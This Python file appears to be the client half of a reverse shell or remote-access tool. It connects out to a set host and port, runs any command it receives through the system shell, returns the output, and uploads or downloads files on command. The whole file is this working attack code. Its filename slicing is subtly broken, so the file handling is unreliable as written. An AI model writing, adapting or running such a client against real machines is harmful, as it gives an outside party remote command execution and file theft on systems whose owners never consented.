# client

import socket
import subprocess
import traceback
import os


def start_connection(host, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((host, port))
    shell_session(client)


def send_file(filename, client):
    """Send a file to the client."""
    if not os.path.isfile(filename):
        print(f'Error: File "{filename}" not found!')
        client.send(b'FILE_NOT_FOUND')
        return

    client.send(b'FILE_OK')  # Notify client that file exists
    file_size = os.path.getsize(filename)
    client.send(str(file_size).encode())  # Send file size

    with open(filename, "rb") as f:
        while chunk := f.read(4096):  # Send in chunks
            client.send(chunk)

    print(f'File "{filename}" sent successfully!')


def recv_file(filename, client):
    """Receive a file from the client."""
    status = client.recv(10).decode()  # Check if the file exists
    if status == 'FILE_NOT_FOUND':
        print(f'Error: Remote file "{filename}" not found!')
        return

    file_size = int(client.recv(20).decode())  # Get file size
    received = 0

    with open(filename, "wb") as f:
        while received < file_size:
            chunk = client.recv(4096)
            if not chunk:
                break
            f.write(chunk)
            received += len(chunk)

    print(f'File "{filename}" received successfully!')


def run_command(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    output = result.stdout + result.stderr
    return output


def shell_session(client):
    
    exit_list = ['exit', 'break', 'close', 'bye', 'quit']

    try:
        while True:
            command = client.recv(1024).decode()
            if command.lower() in exit_list:
                break
            elif command.startswith('download'):
                filename = command[7:]
                send_file(filename, client)
            elif command.startswith('upload'):
                filename = command[5:]
                recv_file(filename, client)
            elif command.startswith('cd '):
                path = command[3:].strip()
                try:
                    os.chdir(path)
                    client.send('chdir'.encode())
                except NotADirectoryError:
                    client.send(f'Error: Not a directory: "{path}"'.encode())
                except FileNotFoundError:
                    client.send(f'Error: No such directory: "{path}"'.encode())
                except PermissionError:
                    client.send(f'Error: Permission denied: "{path}"'.encode())
            else:
                try:
                    output = run_command(command)
                    if not output:
                        client.send('no output!'.encode())
                    else:
                        client.send(output.encode())
                except PermissionError:
                    client.send('Permission denied.'.encode())
                except subprocess.CalledProcessError:
                    client.send('Invalid command.'.encode())
                except FileNotFoundError:
                    client.send('File not found.'.encode())
                except NotADirectoryError:
                    client.send('Not a directory.'.encode())
    except Exception as e:
        trace_error = traceback.format_exc()
        error_msg = f'\n[Client]\nError: {e}\n{trace_error}\n'
        client.send(error_msg.encode())
    finally:
        client.close()


def main():
    host = '127.0.0.1'
    port = 8080

    start_connection(host, port)


if __name__ == '__main__':
    main()


